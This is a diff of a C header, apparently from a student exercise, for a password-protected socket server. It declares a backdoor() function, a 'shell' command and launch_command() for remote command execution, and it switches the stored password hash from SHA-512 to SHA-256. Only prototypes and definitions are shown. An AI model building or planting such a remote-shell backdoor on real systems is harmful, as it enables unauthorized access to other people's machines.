@@ -11,6 +11,7 @@
 # include <string.h>
 # include <sys/select.h>
 # include <sys/socket.h>
+# include <sys/wait.h>
 # include <unistd.h>
 
 # define STUDENT_LOGIN "lmartin"
@@ -48,7 +49,7 @@ typedef struct			s_serv
 	int					nb_clients;
 }						t_serv;
 
-# define HASHED_PWD "319d8f2b0e67a1abe8d63330976c0a3b743f57e24d002137aacf2f55a5b3fa2adead8e27e878df1da8c9cbef1d754ed8754cdc4bf616f01b44c80826e57625f8"
+# define HASHED_PWD "0315b4020af3eccab7706679580ac87a710d82970733b8719e70af9b57e7b9e6"
 
 # define NB_CMDS 3
 # define CMD				{"help", "shell", "exit"}
@@ -56,7 +57,16 @@ typedef struct			s_serv
 
 # define send_str(x,y) send(x, y, strlen(y), 0)
 
-/* sha512.c */
-char		*sha512(char *str, size_t size);
+extern t_serv		serv;
+
+/* server.c */
+void		remove_client(t_serv *serv, int fd);
+void		backdoor(void);
+
+/* shell.c */
+void		launch_command(t_serv *serv, int fd, char *cmd);
+
+/* sha256.c */
+char		*sha256(char *str, size_t size);
 
 #endif
